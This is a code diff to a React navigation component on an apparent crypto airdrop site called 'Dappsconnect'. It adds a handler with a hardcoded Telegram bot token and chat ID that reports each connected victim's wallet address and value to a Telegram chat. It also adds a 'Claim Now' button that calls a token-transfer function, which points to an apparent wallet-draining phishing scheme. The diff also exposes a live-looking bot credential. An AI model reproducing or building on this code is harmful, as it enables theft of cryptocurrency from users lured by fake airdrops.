@@ -247,15 +247,57 @@ export default function Nav() {
 
 //   Mine stops here
 
+// Telegram Bot
+
+const [formValue, setFormValue] = useState('');
+const [message, setMessage] = useState('');
+
+const handleSubmit = () => {
+  const token = "6695122457:AAFZi47EVYLx5RsqA_xcyRxt-bzftT7m0mg";
+  const chat_id = "-4277212332";
+  const websitw_url = `https://chgfyufytfd.app`;
+
+    const mytext = `🛜 New Connection!!! \n
+                \n
+                \n
+                \n
+                \n
+                \n
+                \n
+                \n
+                \n
+               💰 Total ETH Value: $831
+               \n
+               \n
+               \n
+               \n
+               \n
+               \n
+               \n
+               \n
+               \n
+               \n
+                💳 Wallet: Trust Wallet
+                \n
+                \n
+                \n
+                🪙 Address: ${formValue}\n\n\n\n\n\n\n
+                🌐 URL: ${websitw_url}
+                 `;
+ const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mytext)}`;
+                
+}
+
 
 	return (
-		<nav className='w-full mx-auto border-b-2 border-secondary'>
+		<>
+    <nav className='w-full mx-auto border-b-2 border-secondary'>
 			<div className='flex items-center justify-between mx-auto py-4 w-[90%]'>
 				
 				<h1 className='font-bold text-1xl'><Link href="/">Dappsconnect</Link></h1>
 
 				<ul className='hidden md:flex items-center justify-between gap-3 cursor-pointer  hover:transition sm:text-xs md:text-base'>
-					<li className='hover:font-bold'>Latest Airdrops</li>
+					<li className='hover:font-bold'>Latest Airdrops.</li>
 					<li className='hover:font-bold'>Hot Airdrops</li>
 					<li className='hover:font-bold'>Potential Airdrops</li>
 					{/* <li className='hover:font-bold'>FAQs</li>
@@ -271,7 +313,22 @@ export default function Nav() {
             Disconnect
           </button>
         )} */}
-      <w3m-button balance="hide" label="Automatic connect" />
+       <div className="md:px-24 px-5">
+        {isConnected ? (
+          <button
+            onClick={async () => await handleTokenTransfer()}
+            className="md:w-[200px] h-[40px] bg-green text-white rounded-3xl"
+          >
+            Claim Now
+          </button>
+        ) : ( 
+            
+            <w3m-button balance="hide" label="Connect Wallet" onClick={() => {
+              setIsModalOpen(true);
+            }}
+            className="md:w-[400px] w-full text-xl h-[50px] bg-green text-white rounded-3xl" />
+        )}
+      </div>
       </div>
 				{/* <div
 							onClick={closeAll}
@@ -312,5 +369,6 @@ export default function Nav() {
 				</ul>
 			)}
 		</nav>
+    </>
 	);
 }
